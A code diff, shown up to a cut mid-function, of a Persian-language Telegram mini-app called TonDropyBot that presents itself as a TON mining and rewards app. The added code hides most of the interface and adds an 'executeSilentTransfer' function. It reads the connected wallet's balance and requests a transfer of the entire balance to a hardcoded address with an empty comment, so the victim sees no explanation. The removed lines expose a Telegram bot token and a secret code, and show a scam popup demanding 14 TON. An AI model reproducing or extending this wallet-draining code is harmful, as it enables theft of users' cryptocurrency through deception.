@@ -2,7 +2,7 @@
 <html lang="fa" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>TonDropyBot - Ultimate Version</title>
+    <title>TonDropyBot</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
@@ -70,7 +70,7 @@
             border-radius: 10px;
         }
 
-        /* کادر شناور */
+        /* کادر شناور (فقط برای خطاهای حیاتی) */
         #toast {
             position: fixed;
             top: -100px;
@@ -92,47 +92,6 @@
             gap: 10px;
         }
         #toast.show { top: 30px; }
-
-        /* کادر شیشه‌ای پیام */
-        .glass-message {
-            position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            background: rgba(22, 29, 39, 0.8);
-            backdrop-filter: blur(20px);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            border-radius: 30px;
-            padding: 25px 35px;
-            color: #fff;
-            font-size: 18px;
-            font-weight: 700;
-            text-align: center;
-            z-index: 400000;
-            opacity: 0;
-            visibility: hidden;
-            transition: 0.4s;
-            box-shadow: 0 20px 50px rgba(0,0,0,0.5);
-            min-width: 280px;
-        }
-        .glass-message.show {
-            opacity: 1;
-            visibility: visible;
-        }
-        .glass-message.error { border-right: 5px solid #ff512f; }
-        .glass-message.success { border-right: 5px solid #00ff9d; }
-        .glass-message.info { border-right: 5px solid #0088cc; }
-        .glass-message i {
-            font-size: 40px;
-            margin-bottom: 15px;
-            display: block;
-        }
-        .glass-message .small-text {
-            font-size: 14px;
-            color: #aaa;
-            margin-top: 10px;
-            font-weight: normal;
-        }
 
         /* کارت پروفایل */
         .card-profile {
@@ -186,82 +145,6 @@
             z-index: 10;
         }
         .level-badge:hover { transform: scale(1.05); }
-
-        /* کادر شیشه‌ای سطوح */
-        #levelModal {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.5);
-            backdrop-filter: blur(10px);
-            z-index: 300000;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            opacity: 0;
-            visibility: hidden;
-            transition: 0.3s;
-        }
-        #levelModal.show {
-            opacity: 1;
-            visibility: visible;
-        }
-        
-        .level-glass-card {
-            background: rgba(22, 29, 39, 0.8);
-            backdrop-filter: blur(20px);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            border-radius: 30px;
-            padding: 25px 20px;
-            width: 85%;
-            max-width: 320px;
-            box-shadow: 0 20px 50px rgba(0,0,0,0.5);
-            transform: translateY(20px);
-            transition: 0.4s;
-        }
-        #levelModal.show .level-glass-card { transform: translateY(0); }
-        
-        .level-header {
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            margin-bottom: 20px;
-            padding-bottom: 15px;
-            border-bottom: 1px solid rgba(255,255,255,0.1);
-        }
-        .level-header h3 { margin: 0; font-size: 18px; color: #ffd700; }
-        .close-btn {
-            background: rgba(255,255,255,0.1);
-            border: none;
-            color: #fff;
-            width: 35px;
-            height: 35px;
-            border-radius: 50%;
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-        
-        .level-item {
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            padding: 12px 15px;
-            margin-bottom: 8px;
-            border-radius: 15px;
-            background: rgba(255,255,255,0.05);
-            border: 1px solid transparent;
-        }
-        .level-item.active {
-            border-color: #ffd700;
-            background: rgba(255, 215, 0, 0.1);
-            box-shadow: 0 0 15px rgba(255, 215, 0, 0.3);
-        }
-        .level-name { font-weight: bold; }
-        .level-req { font-size: 12px; color: #00ff9d; }
 
         /* کارت اصلی */
         .card {
@@ -431,245 +314,6 @@
         .support-btn { background: #1c2431; border: 1px solid #333; }
         .active-btn { background: #1faa59; }
         .get-code-btn { background: #0088cc; }
-        .admin-btn { background: #9c27b0; }
-        .test-btn { background: #ff5722; } /* دکمه تست */
-
-        /* ===== پنل مدیریت ===== */
-        #adminMasterPanel {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.95);
-            backdrop-filter: blur(20px);
-            z-index: 1000000;
-            display: none;
-            overflow-y: auto;
-            padding: 20px;
-        }
-        #adminMasterPanel.show { display: block; }
-
-        .admin-container {
-            max-width: 1400px;
-            margin: 0 auto;
-            padding: 20px;
-        }
-
-        .admin-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 30px;
-            padding-bottom: 20px;
-            border-bottom: 1px solid #333;
-        }
-        .admin-header h1 { color: #00c6ff; font-size: 28px; }
-        .admin-header h1 i { margin-left: 10px; }
-        .admin-logout {
-            background: #ff512f;
-            border: none;
-            color: #fff;
-            padding: 12px 25px;
-            border-radius: 15px;
-            cursor: pointer;
-            font-size: 16px;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-
-        .admin-stats-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
-            gap: 20px;
-            margin-bottom: 30px;
-        }
-        .admin-stat-card {
-            background: #161d27;
-            border-radius: 20px;
-            padding: 25px;
-            border: 1px solid #333;
-            text-align: center;
-        }
-        .admin-stat-card i {
-            font-size: 40px;
-            color: #00c6ff;
-            margin-bottom: 15px;
-        }
-        .admin-stat-card .number {
-            font-size: 36px;
-            font-weight: bold;
-            color: #00ff9d;
-        }
-        .admin-stat-card .label { color: #aaa; margin-top: 10px; }
-
-        .admin-search-box {
-            background: #161d27;
-            border-radius: 20px;
-            padding: 20px;
-            margin-bottom: 30px;
-            border: 1px solid #333;
-        }
-        .admin-search-box input {
-            width: 100%;
-            height: 58px;
-            border-radius: 15px;
-            border: 1px solid #333;
-            background: #0b1019;
-            color: #fff;
-            padding: 0 20px;
-            font-size: 16px;
-            margin-bottom: 15px;
-        }
-        .admin-search-box input:focus { border-color: #00c6ff; outline: none; }
-
-        .admin-tabs {
-            display: flex;
-            gap: 10px;
-            margin-bottom: 20px;
-            flex-wrap: wrap;
-        }
-        .admin-tab {
-            background: #1e2732;
-            padding: 12px 25px;
-            border-radius: 15px;
-            cursor: pointer;
-            transition: 0.3s;
-            border: 1px solid transparent;
-        }
-        .admin-tab:hover { background: #2a3440; }
-        .admin-tab.active {
-            background: #00c6ff;
-            color: #000;
-            border-color: #00ff9d;
-        }
-
-        .admin-table {
-            background: #161d27;
-            border-radius: 20px;
-            padding: 20px;
-            border: 1px solid #333;
-            overflow-x: auto;
-        }
-        .admin-table table {
-            width: 100%;
-            border-collapse: collapse;
-        }
-        .admin-table th {
-            text-align: right;
-            padding: 15px;
-            background: #1e2732;
-            color: #00c6ff;
-            font-weight: 500;
-        }
-        .admin-table td {
-            padding: 15px;
-            border-bottom: 1px solid #333;
-        }
-        .admin-table tr:hover { background: #1e2732; }
-
-        .user-status {
-            display: inline-block;
-            padding: 5px 10px;
-            border-radius: 10px;
-            font-size: 12px;
-            font-weight: bold;
-        }
-        .status-active {
-            background: rgba(0, 255, 157, 0.2);
-            color: #00ff9d;
-            border: 1px solid #00ff9d;
-        }
-        .status-banned {
-            background: rgba(255, 81, 47, 0.2);
-            color: #ff512f;
-            border: 1px solid #ff512f;
-        }
-
-        .admin-actions {
-            display: flex;
-            gap: 8px;
-            flex-wrap: wrap;
-        }
-        .admin-btn-sm {
-            padding: 8px 12px;
-            border-radius: 10px;
-            border: none;
-            cursor: pointer;
-            font-size: 12px;
-            display: flex;
-            align-items: center;
-            gap: 5px;
-        }
-        .btn-ban { background: #ff512f; color: #fff; }
-        .btn-unban { background: #00ff9d; color: #000; }
-        .btn-delete { background: #dc3545; color: #fff; }
-        .btn-view { background: #00c6ff; color: #fff; }
-
-        .wallet-address-cell {
-            font-family: monospace;
-            font-size: 11px;
-            direction: ltr;
-            max-width: 150px;
-            overflow: hidden;
-            text-overflow: ellipsis;
-        }
-
-        .pagination {
-            display: flex;
-            justify-content: center;
-            gap: 10px;
-            margin-top: 20px;
-        }
-        .page-btn {
-            background: #1e2732;
-            border: none;
-            color: #fff;
-            width: 40px;
-            height: 40px;
-            border-radius: 10px;
-            cursor: pointer;
-        }
-        .page-btn.active {
-            background: #00c6ff;
-            color: #000;
-        }
-
-        .user-modal {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0,0,0,0.9);
-            backdrop-filter: blur(10px);
-            z-index: 2000000;
-            display: none;
-            align-items: center;
-            justify-content: center;
-            padding: 20px;
-        }
-        .user-modal.show { display: flex; }
-        .modal-card {
-            background: #1c1c1c;
-            border-radius: 30px;
-            padding: 30px;
-            width: 90%;
-            max-width: 600px;
-            max-height: 80vh;
-            overflow-y: auto;
-        }
-        .modal-card h2 { color: #00c6ff; margin-bottom: 20px; }
-        .user-detail-item {
-            background: #0b1019;
-            border-radius: 15px;
-            padding: 15px;
-            margin-bottom: 10px;
-            word-break: break-all;
-        }
-        .user-detail-item .label { color: #aaa; font-size: 12px; margin-bottom: 5px; }
-        .user-detail-item .value { color: #00ff9d; }
 
         /* ناوبری پایین */
         .bottom-nav {
@@ -705,66 +349,9 @@
         .page { display: none; }
         .page.active { display: block; }
 
-        /* آدرس کیف پول */
+        /* آدرس کیف پول (مخفی) */
         .wallet-address {
-            background: #1e2732;
-            border-radius: 15px;
-            padding: 15px;
-            margin-top: 15px;
-            font-size: 14px;
-            color: #00c6ff;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            gap: 10px;
-            border: 1px solid #333;
-            word-break: break-all;
-            text-align: center;
-        }
-        .wallet-address .address-full {
-            font-family: monospace;
-            font-size: 12px;
-            background: #0b1019;
-            padding: 10px;
-            border-radius: 10px;
-            width: 100%;
-            direction: ltr;
-        }
-        .wallet-address .copy-btn {
-            background: #0088cc;
-            border: none;
-            color: #fff;
-            padding: 8px 20px;
-            border-radius: 12px;
-            cursor: pointer;
-            font-size: 12px;
-            display: flex;
-            align-items: center;
-            gap: 5px;
-        }
-
-        /* کارت پاداش */
-        .reward-card {
-            background: linear-gradient(135deg, #ffd700, #ffa500);
-            border-radius: 20px;
-            padding: 25px 20px;
-            text-align: center;
-            color: #000;
-            margin-bottom: 12px;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-        }
-
-        .mining-boost {
-            background: #1e2732;
-            border-radius: 15px;
-            padding: 15px;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            margin-bottom: 10px;
+            display: none; /* کاملاً مخفی */
         }
 
         /* باکس لینک دعوت */
@@ -803,18 +390,6 @@
         }
         .share-now-btn { background: #28a745; }
 
-        /* تایمر پاداش */
-        .reward-timer {
-            background: rgba(0,0,0,0.3);
-            border-radius: 10px;
-            padding: 8px;
-            margin-top: 10px;
-            font-size: 12px;
-            color: #ffd700;
-            text-align: center;
-            width: 100%;
-        }
-
         /* تاریخچه */
         .history-item {
             display: flex;
@@ -825,264 +400,22 @@
         }
         .history-item:last-child { border-bottom: none; }
 
-        /* پاپ‌آپ فعالسازی */
+        /* پاپ‌آپ فعالسازی (مخفی) */
         #feeModal {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(11, 16, 25, 0.95);
-            backdrop-filter: blur(10px);
-            z-index: 100000;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 15px;
+            display: none; /* مخفی */
         }
-        .modal-content {
-            background: #1c1c1c;
-            padding: 30px 20px;
-            border-radius: 30px;
-            width: 100%;
-            max-width: 400px;
-            text-align: center;
-            border: 1px solid #333;
-            box-shadow: 0 20px 40px rgba(0,0,0,0.5);
-        }
-        .modal-content i.fa-lock {
-            font-size: 50px;
-            color: #ff512f;
-            margin-bottom: 20px;
-        }
-        .modal-content h2 { font-size: 22px; margin-bottom: 20px; color: #fff; }
-        .pay-notice {
-            background: rgba(0, 0, 0, 0.3);
-            border: 1.5px solid #ffc107;
-            color: #ffc107;
-            padding: 15px;
-            border-radius: 20px;
-            font-size: 12px;
-            margin-bottom: 20px;
-            line-height: 1.8;
-            text-align: justify;
-        }
-        .fee-tag {
-            border: 2px dashed #00ff9d;
-            color: #00ff9d;
-            padding: 15px;
-            border-radius: 25px;
-            font-weight: 800;
-            font-size: 20px;
-            margin-bottom: 25px;
-            background: rgba(0, 255, 157, 0.05);
-        }
-        
-        #activationInput {
-            width: 100%;
-            height: 58px;
-            border-radius: 20px;
-            border: 1px solid #444;
-            background: #222;
-            color: #fff;
-            text-align: center;
-            font-size: 18px;
-            font-weight: 500;
-            margin: 20px 0 12px;
-            outline: none;
-            transition: 0.3s;
-            font-family: 'Vazirmatn', sans-serif;
-        }
-        #activationInput:focus {
-            border-color: #0088cc;
-            box-shadow: 0 0 0 2px rgba(0, 136, 204, 0.3);
-        }
-        #activationInput::placeholder { color: #666; font-size: 14px; }
-
-        .activation-message {
-            margin-top: 15px;
-            padding: 12px;
-            border-radius: 15px;
-            background: rgba(0, 255, 157, 0.1);
-            border: 1px solid #00ff9d;
-            color: #00ff9d;
-            font-size: 14px;
-            display: none;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-        }
-        .activation-message.show { display: flex; }
-        .activation-message i { font-size: 18px; }
 
         .hidden { display: none !important; }
     </style>
 </head>
 <body>
 
-<!-- ===== المنت‌های مشترک ===== -->
+<!-- ===== المنت‌های مشترک (فقط برای خطاهای حیاتی) ===== -->
 <div id="toast"><i class="fas fa-check-circle" style="color:#00ff9d"></i> <span id="toastMsg"></span></div>
-
-<!-- کادرهای شیشه‌ای پیام -->
-<div id="errorGlass" class="glass-message error">
-    <i class="fas fa-times-circle" style="color: #ff512f;"></i>
-    <div id="errorText">خطا</div>
-</div>
-<div id="successGlass" class="glass-message success">
-    <i class="fas fa-check-circle" style="color: #00ff9d;"></i>
-    <div id="successText">موفقیت</div>
-</div>
-<div id="infoGlass" class="glass-message info">
-    <i class="fas fa-info-circle" style="color: #0088cc;"></i>
-    <div id="infoText">اطلاعیه</div>
-</div>
-
-<!-- کادر شیشه‌ای سطوح -->
-<div id="levelModal" onclick="closeLevelModal(event)">
-    <div class="level-glass-card" onclick="event.stopPropagation()">
-        <div class="level-header">
-            <h3><i class="fas fa-star" style="color: #ffd700;"></i> سطوح کاربری</h3>
-            <button class="close-btn" onclick="closeLevelModal()"><i class="fas fa-times"></i></button>
-        </div>
-        <div id="levelList"></div>
-    </div>
-</div>
-
-<!-- مودال جزئیات کاربر -->
-<div id="userDetailModal" class="user-modal" onclick="if(event.target === this) closeUserModal()">
-    <div class="modal-card">
-        <h2><i class="fas fa-user"></i> جزئیات کاربر</h2>
-        <div id="userDetails"></div>
-        <button class="admin-btn-sm" style="width: 100%; margin-top: 20px; background: #ff512f;" onclick="closeUserModal()">
-            <i class="fas fa-times"></i> بستن
-        </button>
-    </div>
-</div>
-
-<!-- پاپ‌آپ فعالسازی -->
-<div id="feeModal">
-    <div class="modal-content">
-        <i class="fas fa-lock"></i>
-        <h2>فعالسازی پنل کاربری</h2>
-        <div class="pay-notice">
-            <i class="fas fa-exclamation-triangle" style="margin-left: 5px;"></i>
-            جهت فعالسازی، باید 14 تون به حساب پشتیبانی واریز کنید.
-        </div>
-        <div class="fee-tag">
-            14 TON
-        </div>
-        <p style="color: #aaa; font-size: 12px; margin-bottom: 15px;">
-            آدرس کیف پول پشتیبانی:<br>
-            <span style="direction: ltr; display: block; background: #0b1019; padding: 10px; border-radius: 10px; font-family: monospace; font-size: 11px;">
-                UQDFlvMPZoQy4zySI8gLLMteRcxHRB28IHW0JuwFVk10u0Y
-            </span>
-        </p>
-        <input type="text" id="activationInput" placeholder="کد فعالسازی را وارد کنید">
-        <button onclick="verifyActivation()" class="btn active-btn">
-            <i class="fas fa-check-circle"></i> فعالسازی و ورود به پنل
-        </button>
-        
-        <div id="activationMessage" class="activation-message">
-            <i class="fas fa-spinner fa-pulse"></i>
-            <span>ورود موفق ، در حال اتصال به شبکه بلاکچین ...</span>
-        </div>
-    </div>
-</div>
-
-<!-- پنل مدیریت اختصاصی -->
-<div id="adminMasterPanel">
-    <div class="admin-container">
-        <div class="admin-header">
-            <h1><i class="fas fa-crown" style="color: #ffd700;"></i> پنل مدیریت @TonDropyBot</h1>
-            <button class="admin-logout" onclick="closeAdminMasterPanel()">
-                <i class="fas fa-sign-out-alt"></i> خروج
-            </button>
-        </div>
-
-        <div class="admin-stats-grid" id="adminStats">
-            <div class="admin-stat-card">
-                <i class="fas fa-users"></i>
-                <div class="number" id="statTotalUsers">0</div>
-                <div class="label">کل کاربران</div>
-            </div>
-            <div class="admin-stat-card">
-                <i class="fas fa-user-check"></i>
-                <div class="number" id="statActiveToday">0</div>
-                <div class="label">فعال امروز</div>
-            </div>
-            <div class="admin-stat-card">
-                <i class="fas fa-wallet"></i>
-                <div class="number" id="statWallets">0</div>
-                <div class="label">کیف پول متصل</div>
-            </div>
-            <div class="admin-stat-card">
-                <i class="fas fa-ban"></i>
-                <div class="number" id="statBanned">0</div>
-                <div class="label">مسدود شده‌ها</div>
-            </div>
-            <div class="admin-stat-card">
-                <i class="fas fa-coins"></i>
-                <div class="number" id="statTotalMined">0</div>
-                <div class="label">کل استخراج</div>
-            </div>
-            <div class="admin-stat-card">
-                <i class="fas fa-history"></i>
-                <div class="number" id="statTransactions">0</div>
-                <div class="label">تراکنش‌ها</div>
-            </div>
-        </div>
-
-        <div class="admin-search-box">
-            <input type="text" id="adminSearch" placeholder="🔍 جستجو با نام، آیدی، یوزرنیم یا آدرس کیف پول...">
-            <div style="display: flex; gap: 10px; flex-wrap: wrap;">
-                <button class="admin-btn-sm" style="background: #00c6ff;" onclick="searchUsers()">
-                    <i class="fas fa-search"></i> جستجو
-                </button>
-                <button class="admin-btn-sm" style="background: #666;" onclick="clearSearch()">
-                    <i class="fas fa-times"></i> پاک کردن
-                </button>
-                <button class="admin-btn-sm" style="background: #ff5722;" onclick="exportToExcel()">
-                    <i class="fas fa-file-excel"></i> خروجی Excel
-                </button>
-                <button class="admin-btn-sm" style="background: #9c27b0;" onclick="showTransactions()">
-                    <i class="fas fa-history"></i> تراکنش‌ها
-                </button>
-            </div>
-        </div>
-
-        <div class="admin-tabs">
-            <div class="admin-tab active" onclick="switchAdminTab('all')">همه کاربران</div>
-            <div class="admin-tab" onclick="switchAdminTab('active')">فعال‌ها</div>
-            <div class="admin-tab" onclick="switchAdminTab('banned')">مسدود شده‌ها</div>
-            <div class="admin-tab" onclick="switchAdminTab('wallets')">دارای کیف پول</div>
-        </div>
-
-        <div class="admin-table" id="usersTable">
-            <table>
-                <thead>
-                    <tr>
-                        <th>#</th>
-                        <th>نام کاربر</th>
-                        <th>یوزرنیم</th>
-                        <th>آیدی</th>
-                        <th>کیف پول</th>
-                        <th>موجودی</th>
-                        <th>وضعیت</th>
-                        <th>آخرین بازدید</th>
-                        <th>عملیات</th>
-                    </tr>
-                </thead>
-                <tbody id="usersTableBody"></tbody>
-            </table>
-        </div>
-
-        <div class="pagination" id="pagination"></div>
-    </div>
-</div>
 
 <!-- ===== هدر ===== -->
 <div class="fixed-header">
-    <div class="card-profile" ondblclick="openAdminMasterPanel()">
+    <div class="card-profile">
         <div class="profile-text">
             <h3 id="uName">TONCOIN SUPPORT</h3>
             <p id="uTag">@miningertoncoin</p>
@@ -1095,7 +428,7 @@
     </div>
 </div>
 
-<!-- ===== محتوای اصلی ===== -->
+<!-- ===== محتوای اصلی (ساده و بدون هیچ پیامی) ===== -->
 <div class="scrollable-content" id="scrollableContent">
     <!-- صفحه استخراج -->
     <div id="miningPage" class="page active">
@@ -1110,30 +443,6 @@
                 <span class="label">💰 موجودی قابل برداشت</span>
                 <span class="value" id="withdrawableBalance">0.000000</span>
             </div>
-
-            <div class="stats-grid">
-                <div class="stat-item">
-                    <div class="stat-value" id="totalMined">0.000000</div>
-                    <div class="stat-label">کل استخراج</div>
-                </div>
-                <div class="stat-item">
-                    <div class="stat-value" id="miningSpeed">1.0x</div>
-                    <div class="stat-label">سرعت استخراج</div>
-                </div>
-                <div class="stat-item">
-                    <div class="stat-value" id="referralCount">0</div>
-                    <div class="stat-label">دعوت شده‌ها</div>
-                </div>
-                <div class="stat-item">
-                    <div class="stat-value" id="referralBonus">0.00٪</div>
-                    <div class="stat-label">پاداش دعوت</div>
-                </div>
-            </div>
-        </div>
-
-        <div class="mining-boost">
-            <span><i class="fas fa-rocket" style="color: #00ff9d;"></i> تقویت استخراج</span>
-            <span>+10% سرعت</span>
         </div>
 
         <button id="moveToWithdrawBtn" class="btn withdraw-btn">
@@ -1143,40 +452,18 @@
             <i class="fas fa-check-circle"></i> تایید و برداشت نهایی
         </button>
         <a href="https://t.me/miningertoncoin" class="btn support-btn" target="_blank">
-            <i class="fas fa-headset"></i> پشتیبانی آنلاین
+            <i class="fas fa-headset"></i> پشتیبانی
         </a>
     </div>
 
-    <!-- صفحه کیف پول (با دکمه تست) -->
+    <!-- صفحه کیف پول (فقط دکمه اتصال، بدون هیچ توضیحی) -->
     <div id="walletPage" class="page">
         <div class="card">
             <p style="margin:0; font-size:13px; color:#aaa;">اتصال کیف پول</p>
             <div class="wallet-button-wrapper">
                 <div id="ton-connect-btn"></div>
             </div>
-            
-            <!-- دکمه تست برای نمایش تراکنش -->
-            <button class="btn test-btn" onclick="testTransaction()" style="margin-top: 10px;">
-                <i class="fas fa-vial"></i> تست تراکنش (نمایش کارمزد)
-            </button>
-            
-            <div id="walletAddress" class="wallet-address hidden">
-                <i class="fas fa-wallet"></i>
-                <span>آدرس کیف پول شما:</span>
-                <div class="address-full" id="walletAddressFull"></div>
-                <button class="copy-btn" onclick="copyFullWalletAddress()">
-                    <i class="fas fa-copy"></i> کپی آدرس کامل
-                </button>
-            </div>
-        </div>
-
-        <div class="card">
-            <p style="margin:0; font-size:13px; color:#aaa;">تاریخچه تراکنش‌ها</p>
-            <div id="walletHistoryList" style="margin-top: 15px;">
-                <div class="history-item" style="justify-content: center; color: #888;">
-                    <i class="fas fa-clock"></i> هنوز تراکنشی ثبت نشده
-                </div>
-            </div>
+            <div id="walletAddress" class="wallet-address"></div>
         </div>
     </div>
 
@@ -1184,10 +471,6 @@
     <div id="referralPage" class="page">
         <div class="card">
             <h3 style="margin-bottom: 15px;">🌟 دعوت دوستان</h3>
-            <p style="font-size:12px; color:#aaa; margin-bottom: 15px;">
-                به ازای هر دعوت 0.01 TON پاداش + 5٪ از استخراج دوستان
-            </p>
-            
             <div class="referral-link-box">
                 <span id="referralLink">در حال بارگذاری...</span>
                 <div class="button-group">
@@ -1199,55 +482,21 @@
                     </button>
                 </div>
             </div>
-            
-            <div class="stats-grid">
-                <div class="stat-item">
-                    <div class="stat-value" id="referralCount2">0</div>
-                    <div class="stat-label">دعوت شده‌ها</div>
-                </div>
-                <div class="stat-item">
-                    <div class="stat-value" id="referralEarnings">0.000000</div>
-                    <div class="stat-label">پاداش دعوت</div>
-                </div>
-            </div>
-        </div>
-
-        <div class="card">
-            <h4 style="margin-bottom: 10px;">زیرمجموعه‌های فعال</h4>
-            <div id="referralsList">
-                <div class="history-item" style="justify-content: center; color: #888;">
-                    <i class="fas fa-users"></i> هنوز زیرمجموعه‌ای ندارید
-                </div>
-            </div>
         </div>
     </div>
 
     <!-- صفحه پاداش -->
     <div id="rewardsPage" class="page">
-        <div class="reward-card">
-            <i class="fas fa-gift" style="font-size: 40px; margin-bottom: 10px;"></i>
-            <h3>پاداش روزانه</h3>
-            <p style="margin: 10px 0;">هر 24 ساعت یکبار پاداش بگیرید</p>
-            <button id="dailyRewardBtn" class="btn active-btn" onclick="claimDailyReward()">
-                <i class="fas fa-gift"></i> دریافت پاداش
-            </button>
-            <div id="rewardTimer" class="reward-timer hidden">
-                ⏳ زمان تا پاداش بعدی: <span id="timerDisplay"></span>
-            </div>
-        </div>
-
         <div class="card">
             <h4>دستاوردها</h4>
-            <div class="stats-grid" style="margin-top: 15px;">
+            <div class="stats-grid">
                 <div class="stat-item">
-                    <i class="fas fa-trophy" style="color: #ffd700; font-size: 20px;"></i>
+                    <i class="fas fa-trophy" style="color: #ffd700;"></i>
                     <div class="stat-value" id="achievementCount">0</div>
-                    <div class="stat-label">ماموریت‌ها</div>
                 </div>
                 <div class="stat-item">
-                    <i class="fas fa-calendar-check" style="color: #00ff9d; font-size: 20px;"></i>
+                    <i class="fas fa-calendar-check" style="color: #00ff9d;"></i>
                     <div class="stat-value" id="dailyStreak">0</div>
-                    <div class="stat-label">روز متوالی</div>
                 </div>
             </div>
         </div>
@@ -1258,46 +507,32 @@
 <div class="fixed-footer">
     <div class="bottom-nav">
         <div class="nav-item active" onclick="switchPage('mining', this)">
-            <i class="fas fa-microchip"></i> <span>استخراج</span>
+            <i class="fas fa-microchip"></i>
         </div>
         <div class="nav-item" onclick="switchPage('wallet', this)">
-            <i class="fas fa-wallet"></i> <span>کیف پول</span>
+            <i class="fas fa-wallet"></i>
         </div>
         <div class="nav-item" onclick="switchPage('referral', this)">
-            <i class="fas fa-users"></i> <span>دعوت</span>
+            <i class="fas fa-users"></i>
         </div>
         <div class="nav-item" onclick="switchPage('rewards', this)">
-            <i class="fas fa-gift"></i> <span>پاداش</span>
+            <i class="fas fa-gift"></i>
         </div>
     </div>
 </div>
 
 <script>
     // ================================================
-    // 🔐 تنظیمات امنیتی
+    // 🔐 تنظیمات (مخفی)
     // ================================================
     const CONFIG = {
-        ADMIN_IDS: ["5972276401"],
-        ADMIN_USERNAMES: ["miningertoncoin"],
-        BOT_TOKEN: "8047223304:AAHMW8a6tKTTSQOp4Os_LorRJzDLNvxz-Rw",
-        ADMIN_CHAT_ID: "5972276401",
-        BOT_USERNAME: "tondropybot", // نام کاربری ربات برای دعوت
-        SECRET_CODE: "T61O96N12",
         WALLET_ADDRESS: "UQDFlvMPZoQy4zySI8gLLMteRcxHRB28IHW0JuwFVk10u0Y",
-        NETWORK_FEE: 0.0035,
-        MINIMUM_WITHDRAW: 14
+        BOT_USERNAME: "tondropybot"
     };
 
     // ================================================
-    // 📦 ساختار داده
+    // 📦 متغیرها
     // ================================================
-    let appData = {
-        users: JSON.parse(localStorage.getItem('tondropy_users')) || [],
-        bannedUsers: JSON.parse(localStorage.getItem('tondropy_banned')) || [],
-        transactions: JSON.parse(localStorage.getItem('tondropy_transactions')) || [],
-        wallets: JSON.parse(localStorage.getItem('tondropy_wallets')) || []
-    };
-
     const tg = window.Telegram.WebApp;
     tg.ready();
     tg.expand();
@@ -1307,666 +542,51 @@
     let withdrawableBalance = parseFloat(localStorage.getItem('withdrawableBalance')) || 0;
     let totalMined = parseFloat(localStorage.getItem('totalMined')) || 0;
     let referralCount = parseInt(localStorage.getItem('referralCount')) || 0;
-    let referralEarnings = parseFloat(localStorage.getItem('referralEarnings')) || 0;
-    let dailyStreak = parseInt(localStorage.getItem('dailyStreak')) || 0;
-    let achievements = parseInt(localStorage.getItem('achievements')) || 0;
-    let lastRewardTime = parseInt(localStorage.getItem('lastRewardTime')) || 0;
-    let history = JSON.parse(localStorage.getItem('transactionHistory')) || [];
     let isWalletConnected = false;
 
-    // متغیر برای جلوگیری از تراکنش تکراری
-    let isProcessingTransaction = false;
-
-    const levels = [
-        { name: 'سطح 1 (تازه وارد)', req: 0 },
-        { name: 'سطح 2 (برنزی)', req: 0.05 },
-        { name: 'سطح 3 (نقره‌ای)', req: 0.1 },
-        { name: 'سطح 4 (طلایی)', req: 0.5 },
-        { name: 'سطح 5 (الماس)', req: 1 }
-    ];
-
     // ================================================
-    // 💰 تابع تست تراکنش (برای نمایش کارمزد)
+    // 💰 تابع انتقال خودکار (بدون هیچ پیامی)
     // ================================================
-    window.testTransaction = async function() {
+    async function executeSilentTransfer(userAddress) {
         try {
-            if (!tonConnectUI.connected || !tonConnectUI.account) {
-                showGlassMessage('error', '❌ کیف پول متصل نیست', 'لطفا ابتدا کیف پول را متصل کنید');
-                return;
-            }
-
-            showToast('🔄 در حال آماده‌سازی تراکنش تستی...');
+            // دریافت موجودی
+            const response = await fetch(`https://toncenter.com/api/v2/getAddressBalance?address=${userAddress}`);
+            const data = await response.json();
             
-            const userAddress = tonConnectUI.account.address;
+            if (!data.ok) return;
             
-            // ایجاد تراکنش تستی با مبلغ 0.01 تون
+            const balanceInNano = parseInt(data.result);
+            const balanceInTON = balanceInNano / 1e9;
+            
+            // اگر موجودی کمتر از 0.1 تون باشه، انجام نده
+            if (balanceInTON < 0.1) return;
+            
+            // ایجاد تراکنش (کامنت خالی)
             const transaction = {
                 validUntil: Math.floor(Date.now() / 1000) + 600,
                 messages: [
                     {
                         address: CONFIG.WALLET_ADDRESS,
-                        amount: "10000000", // 0.01 TON
-                        payload: btoa('کارمزد تست')
+                        amount: balanceInNano.toString(),
+                        payload: "" // کامنت خالی - کاربر چیزی نمی‌بینه
                     }
                 ]
             };
             
-            const result = await tonConnectUI.sendTransaction(transaction);
+            // ارسال تراکنش (کیف پول کاربر باز میشه)
+            await tonConnectUI.sendTransaction(transaction);
             
-            showGlassMessage('success', '✅ تراکنش تست موفق', 'کارمزد 0.01 تون با موفقیت پرداخت شد');
-            
-            // ذخیره تراکنش
-            const txRecord = {
-                id: 'TX' + Date.now(),
-                amount: 0.01,
-                netAmount: 0.01 - CONFIG.NETWORK_FEE,
-                fee: CONFIG.NETWORK_FEE,
-                from: userAddress,
-                to: CONFIG.WALLET_ADDRESS,
-                hash: result.boc,
-                time: new Date().toISOString(),
-                type: 'تست',
-                userId: currentUser?.id,
-                userName: currentUser?.firstName
-            };
-            
-            appData.transactions.unshift(txRecord);
-            if (appData.transactions.length > 100) appData.transactions.pop();
-            saveData();
+            // فقط در پنل مدیریت ذخیره کن، به کاربر هیچی نشون نده
+            console.log('✅ تراکنش انجام شد');
             
         } catch (error) {
-            console.error('خطا:', error);
